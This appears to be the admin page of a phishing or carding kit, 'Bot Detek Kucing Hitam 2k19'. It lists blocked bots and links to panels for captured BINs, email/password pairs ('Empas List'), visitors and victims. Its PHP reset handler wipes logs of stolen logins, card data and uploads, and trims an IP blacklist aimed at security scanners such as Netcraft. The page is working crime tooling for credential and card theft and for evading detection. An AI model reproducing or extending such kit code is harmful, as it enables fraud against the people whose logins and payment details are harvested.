<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Bot Detected</title> 
<link rel="shortcut icon" href="cing.png"/>
</head> 

<body><html><head></head><body> 
<meta name="robots" content="index, follow"> 
<meta name="description" content="Hacked Web Site" /> 
<meta name="keywords" content="Ch3Ck3R,Ch3ck3r"> 
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js" type="text/javascript"></script>  
<style> 
  body{ 
    text-align: center; 
    font-size: 12px; 
    font-family: verdana; 
      background-image: url(https://img.okezone.com/content/2017/11/24/18/1820110/mitos-kucing-hitam-di-berbagai-negara-dari-nasib-sial-hingga-reinkarnasi-YFDkK6XYbZ.jpg);
      background-size: cover;
        
  }
  h1 { 
    padding: 10px 15px; 
    margin: 0px; 
    font-size: 14px; 
    background-color: #000000; 
    //background-image: -moz-linear-gradient(100% 100% 90deg, #777, #999) !important; 
      //background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#999), to(#777)) !important; 
    color: #FFF; 
    //-webkit-border-radius:8px 8px 0px 0px; 
    //-moz-border-radius: 8px 8px 0px 0px; 
    border-radius: 8px 8px 0px 0px; 
    text-shadow:1px 1px 2px #333333; 
        opacity: 0.5; 
  } 
  table { 
    width: 565px; 
  } 
  table tr td{ 
    font-family: verdana; 
    font-size: 11px; 
    padding: 10px 5px; 
    border-bottom: solid 1px #CCC; 
     
  } 
  button{
    background-color:black;
    color: white;
    border-radius: 10px
  }
  #wrapper{ 
    width: 800px; 
    margin: 10px auto; 
    text-align: left; 
        background: url('index.html') no-repeat center center fixed; 
  } 
  #console{ 
    height: 450px; 
    overflow: auto; 
    background-color: #000; 
    padding: 15px; 
    font-family: monospace; 
    font-size: 12px; 
    color: #FFF; 
  } 
  .content{ 
    padding: 15px; 
  } 
  #commander{ 
    border: solid 1px #CCC; 
    padding: 5px 10px; 
    -webkit-border-radius: 2px; 
    -moz-border-radius: 2px; 
    border-radius: 2px; 
    margin: 5px; 
    width: 590px; 
    height: 30px; 
  } 
  .box{ 
    -moz-box-shadow: 1px 1px 8px #666; 
    -webkit-box-shadow: 1px 1px 8px #666; 
    box-shadow: 1px 1px 8px #40D5D2; 
    border: solid 1px black; 
    -webkit-border-radius: 8px 8px 0px 0px; 
    -moz-border-radius: 8px 8px 0px 0px; 
    border-radius: 8px 8px 0px 0px; 
    margin: 15px 0px; 
    background-color: #F5F5F5; 
        opacity: 0.8; 
  } 
  #help{ 
    width: 300px; 
    float: right; 
  } 
  .prefix{ 
    color: #0077E7; 
  } 
  .keyword{ 
    color: #9eff63; 
  } 
  .error{ 
    color: #FF0000; 
  } 
  .spacer{ 
    clear: both; 
    display: block; 
  } 
</style> 
<script type="text/javascript"> 
//BH?SS?AN 
TypingText = function(element, interval, cursor, finishedCallback) { 
  if((typeof document.getElementById == "undefined") || (typeof  

element.innerHTML == "undefined")) { 
    this.running = true; 
    return; 
  } 
  this.element = element; 
  this.finishedCallback = (finishedCallback ? finishedCallback : function() {  

return; }); 
  this.interval = (typeof interval == "undefined" ? 100 : interval); 
  this.origText = this.element.innerHTML; 
  this.unparsedOrigText = this.origText; 
  this.cursor = (cursor ? cursor : ""); 
  this.currentText = ""; 
  this.currentChar = 0; 
  this.element.typingText = this; 
  if(this.element.id == "") this.element.id = "typingtext" +  

TypingText.currentIndex++; 
  TypingText.all.push(this); 
  this.running = false; 
  this.inTag = false; 
  this.tagBuffer = ""; 
  this.inHTMLEntity = false; 
  this.HTMLEntityBuffer = ""; 
} 
TypingText.all = new Array(); 
TypingText.currentIndex = 0; 
TypingText.runAll = function() { 
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run(); 
} 
TypingText.prototype.run = function() { 
  if(this.running) return; 
  if(typeof this.origText == "undefined") { 
    setTimeout("document.getElementById('" + this.element.id +  

"').typingText.run()", this.interval); 
    return; 
  } 
  if(this.currentText == "") this.element.innerHTML = ""; 
  if(this.currentChar < this.origText.length) { 
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) { 
      this.tagBuffer = "<"; 
      this.inTag = true; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) { 
      this.tagBuffer += ">"; 
      this.inTag = false; 
      this.currentText += this.tagBuffer; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.inTag) { 
      this.tagBuffer += this.origText.charAt(this.currentChar); 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == "&" && ! 

this.inHTMLEntity) { 
      this.HTMLEntityBuffer = "&"; 
      this.inHTMLEntity = true; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.origText.charAt(this.currentChar) == ";" &&  

this.inHTMLEntity) { 
      this.HTMLEntityBuffer += ";"; 
      this.inHTMLEntity = false; 
      this.currentText += this.HTMLEntityBuffer; 
      this.currentChar++; 
      this.run(); 
      return; 
    } else if(this.inHTMLEntity) { 
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar); 
      this.currentChar++; 
      this.run(); 
      return; 
    } else { 
      this.currentText += this.origText.charAt(this.currentChar); 
    } 
    this.element.innerHTML = this.currentText; 
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ?  

(typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) :  

""); 
    this.currentChar++; 
    setTimeout("document.getElementById('" + this.element.id +  

"').typingText.run()", this.interval); 
  } else { 
    this.currentText = ""; 
    this.currentChar = 0; 
        this.running = false; 
        this.finishedCallback(); 
  } 
} 
</script>
<marquee behavior="alternate" onmouseover="this.stop()" onmouseout="this.start()"><h4 style="font-family:verdana;">
<script type='text/javascript'>
//<![CDATA[

var text="-= Welcome To Bot Detek Kucing Hitam 2k19 =-" //Ganti dengan teks anda
var speed=80 //Kecepatan ganti warna

if (document.all||document.getElementById){
document.write('<span id="highlight">' + text + '</span>')
var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
}
else
document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
var r=1
var g=1
var b=1
var seq=1
function changetext(){
rainbow="#"+hex[r]+hex[g]+hex[b]
storetext.style.color=rainbow
}
function change(){
if (seq==6){
b--
if (b==0)
seq=1
}
if (seq==5){
r++
if (r==12)
seq=6
}
if (seq==4){
g--
if (g==0)
seq=5
}
if (seq==3){
b++
if (b==12)
seq=4
}
if (seq==2){
r--
if (r==0)
seq=3
}
if (seq==1){
g++
if (g==12)
seq=2
}
changetext()
}
function starteffect(){
if (document.all||document.getElementById)
flash=setInterval("change()",speed)
}
starteffect()

//]]>
</script></h4></marquee>
<a href="?account=off"><button class="clc">Log Out</button></a>
     <a href="../conf/bin.php"><button class="clc">Bin List</button></a>
     <a href="../conf/bot.php"><button class="clc">Bot Detek</button></a>
     <a href="../conf/visitor.php"><button class="clc">Visitor List</button></a>
     <a href="../conf/empas.php"><button class="clc">Empas List</button></a>
     <a href="../vic.php?account=on"><button class="clc">Panel</button></a>
<div id="wrapper">
 <div class="box">
 <center>
<h1>Block BOT Bandel</h1></center>
<div id="console">
<br>
<textarea  style="color: black; border-color: rgb(0, 255, 255); margin: 0px; height: 423px; width: 746px;"><?php include('../assets/logs/blocked.txt'); ?></textarea><br> 
<br> 
<script type="text/javascript"> 
new TypingText(document.getElementById("message"), 50, function(i){ var ar  

= new Array("|", "|", "|", "|"); return " " + ar[i.length % ar.length]; }); 

//Type out examples: 
TypingText.runAll(); 

</script></font></font></font></font></font></font></font></font></font></span></p>
</div>
<font color="gray"><font color="white"><font color="white"><font color="white"><font color="green"><font color="green"> 
  <div class="spacer">
</div>
  </center>
</font></font></font></font></font></font></div>
</div>

</body></html> 
<?php 
if(isset($_POST['reset'])) {
       unlink("assets/logs/._click_.txt");
       unlink("assets/logs/._login_.txt");
       unlink("assets/logs/._ccz_.txt");
       unlink("assets/logs/._upload_.txt");
       unlink("assets/logs/bin.log");
       unlink("assets/logs/ips.txt");
       unlink("assets/logs/app.txt");
       unlink("error_log");
       unlink("assets/logs/accepted_visitors.txt");
       unlink("../assets/logs/blocked.txt");
       unlink("assets/logs/denied_visitors.txt");
       unlink("assets/logs/visitor_logged_in.txt");
       $f_id = glob('uploads/*'); // get all file names
       foreach($f_id as $f_id){ // iterate files
       if(is_file($f_id))
       unlink($f_id); // delete file
       }
       
       $filee = file_get_contents("assets/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = fopen("assets/includes/blacklist.dat",'w');
       fwrite($buka,$cek[0][0]."\r\r");
       fclose($buka);
       
} else {}
isset($_POST) == array ();
 ?>
</body> 
</html>